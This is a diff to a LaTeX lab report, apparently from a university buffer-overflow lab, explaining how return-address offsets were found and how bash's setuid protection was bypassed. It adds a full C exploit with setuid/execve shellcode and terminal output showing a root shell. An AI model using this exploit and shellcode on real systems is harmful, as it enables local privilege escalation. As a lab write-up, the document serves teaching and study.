@@ -491,9 +491,9 @@ Once the vulnerable program reads the shellcode from the input file into a buffe
 
 It is not enough, however, to inject the shellcode, because when the program finishes executing \texttt{bof} method, it returns (or at least attempts to return) to \texttt{main} method. The program might crash at this point and this is because there is a return address on the stack and we might overwrite it.
 
-So, our goal is to modify the return address in such a way, so that the program carries on execution not back in \texttt{main} method, but on the stack where our malicious shell code is. We copied the code of vulnerable program and examined the stack with GDB. We quickly discovered, that we could obviously ignore first 12 bytes, then we could ignore value of ebp register and what next four bytes was stored return address. Our exploit's code is shown in~\ref{bof:exploit1}. 
+So, our goal is to modify the return address in such a way, so that the program carries on execution not back in \texttt{main} method, but on the stack where our malicious shell code is. We copied the code of vulnerable program and examined the stack with GDB. We quickly discovered, that we could obviously ignore first 12 bytes, also we could next four bytes as they are first argument provided to the function which just a pointer in our case which is 4 bytes. Next two values are our return address and saved stack frame pointer, so in total we could skip 16 bytes and place our own "return address" there. Our exploit's code is shown in~\ref{bof:exploit1}. 
 
-We discovered where we want to put our address that we will make \texttt{bof} method jump to upon returning from the function, however we now had to think what the address to write there. Because virtual space randomization is turned off, we could use the value of \text{buffer} array in the exploit as a reference. By trial and error we discovered that the the stack point points a bit further in the vulnerable program when executing the string copy method, therefore we hard coded a value by which we need to increase desired address. Also, most of the buffer is pre-filled with \texttt{NOP} instructions to which we jump on the stack, and then after executing many \texttt{NOP}s we reach our mallicious code and we can get root access as shown below in Listing~\ref{bof:root1}.
+We discovered where we want to put our address in order to force the \texttt{bof} method to jump to our code upon returning from the function, however we now had to think what value of an address to write there. Because virtual space randomization is turned off, we could use the value of \text{buffer} array in the exploit as a reference. By trial and error we discovered that the the stack point points a bit further in the vulnerable program when executing the string copy method, therefore we hard coded a value by which we need to increase desired address. Also, most of the buffer is pre-filled with \texttt{NOP} instructions to which we jump on the stack, and then after executing many \texttt{NOP}s we reach our mallicious code and we can get root access as shown below in Listing~\ref{bof:root1}.
 \vspace{1em}
 \lstset{
 	captionpos=b,
@@ -518,8 +518,33 @@ root
 
 \subsubsection{Protection in /bin/bash}
 
-\lipsum[2]
+Next step of our task was to test if we can use the exploit to get root access if
+the \texttt{/bin/sh} symbolic link pointed back to \texttt{/bin/bash} rather than Z-shell. It turned out that exploit could execute bash, however no root access was given even though the vulnerable program  process runs with the user ID set to 0 (root). 
 
+As it turns out, Bash shell has implemented a protection mechanism. If the current user uid number does not match the Set-UID of the processes it is executed from, Bash sets the uid of the user, so in our case it ignores the fact that the program that launched the shell was running with root's user id. The workaround to this problem is to use \texttt{setuid} system call, which "sets the effective user ID of the calling process"\cite{setuidman} before launching the shell, so that current user and the program launching bash will have matching uid of 0. We had to change the program we wanted to execute so that it makes a call to \texttt{setuid} before calling symbolic link \texttt{/bin/sh}. Rather than creating our own shell-code from scratch we found a ready solution in an on-line shellcode repository\cite{shellstorm}. Using this shell code in our exploit, without further modifications we were able to gain root access in Bash.
+
+\vspace{1em}
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=BASH,
+	breaklines=true,
+	caption=Function with buffer overflow vulnerability,
+	label=bof:root2,
+}
+\begin{lstlisting}
+seed@seed-desktop:~/buffer$ ./exploit 
+Size of shellcode: 30
+Using Stack pointer at address: bffff314
+Buffer size: 517, shell code size: 30
+I will start writing to bffff4fa
+seed@seed-desktop:~/buffer$ ./stack 
+sh-3.2# id
+uid=0(root) gid=1000(seed) groups=4(adm),20(dialout),24(cdrom),46(plugdev),106(lpadmin),121(admin),122(sambashare),1000(seed)
+sh-3.2# whoami
+root
+sh-3.2# 
+\end{lstlisting}
 
 \subsubsection{Address Randomization}
 
@@ -692,6 +717,92 @@ void main(int argc, char **argv)
   badfile = fopen("./badfile", "w");
   fwrite(buffer, 517, 1, badfile);
   fclose(badfile);
+}
+\end{lstlisting}
+
+\lstset{
+	captionpos=b,
+	frame=single,
+	language=C,
+	breaklines=true,
+	caption=Exploit for getting root with bash,
+	label=bof:exploit2
+}
+\begin{lstlisting}
+/* exploit.c - Bash version  */
+/* A program that creates a file containing code for launching shell*/
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* 
+	Shell code from: 
+	http://shell-storm.org/shellcode/files/shellcode-598.php 
+*/
+char shellcode[]=
+"\x31\xdb"             /* xor    %ebx,%ebx       */
+"\x8d\x43\x17"         /* lea    0x17(%ebx),%eax */
+"\xcd\x80"             /* int    $0x80           */
+"\x53"                 /* push   %ebx            */
+"\x68\x6e\x2f\x73\x68" /* push   $0x68732f6e     */
+"\x68\x2f\x2f\x62\x69" /* push   $0x69622f2f     */
+"\x89\xe3"             /* mov    %esp,%ebx       */
+"\x50"                 /* push   %eax            */
+"\x53"                 /* push   %ebx            */
+"\x89\xe1"             /* mov    %esp,%ecx       */
+"\x99"                 /* cltd                   */
+"\xb0\x0b"             /* mov    $0xb,%al        */
+"\xcd\x80"             /* int    $0x80           */
+;
+
+void main(int argc, char **argv)
+{  
+	char buffer[517];
+	FILE *badfile;
+	long fcP;
+	int buffer_size, shell_code_size;
+	
+	buffer_size = sizeof(buffer);
+	shell_code_size = sizeof(shellcode);
+	
+	/* Initialize buffer with 0x90 (NOP instruction) */
+	memset(&buffer, 0x90, 517);
+	
+	/* You need to fill the buffer with appropriate contents here */
+	printf("Size of shellcode: %d\n", sizeof(shellcode));
+	
+	/* Print stack pointer */
+	fcP = &buffer;
+	
+	/* Make sure is multiple of 4 */ 
+	while(fcP % 4 != 0) {
+		fcP += 1;
+	}
+	
+	printf ("Using Stack pointer at address: %x\n", fcP);
+	printf ("Buffer size: %d, shell code size: %d\n", buffer_size, shell_code_size);
+	
+	/* Compute how far we can palce shell code, we want it towards the end of buffer */
+	long address_to_copy_to = fcP + buffer_size - 1 - shell_code_size;
+	printf ("I will start writing to %08x\n", address_to_copy_to);
+	
+	/* We use address of buffer as reference, but we want to jump a bit more into the stack,
+	yet not too far */
+	fcP += 80;
+	
+	/* Place the address we want to in a position 
+	that would overwrite return address (16 bytes into stack) */
+	long addr = fcP;
+	long *ptr = (long*)(buffer + 16);
+	*(ptr) = addr;
+	
+	/* Copy shellcode */
+	memcpy(address_to_copy_to, shellcode, shell_code_size);
+	
+	/* Save the contents to the file "badfile" */
+	badfile = fopen("./badfile", "w");
+	fwrite(buffer, 517, 1, badfile);
+	fclose(badfile);
 }
 \end{lstlisting}
 
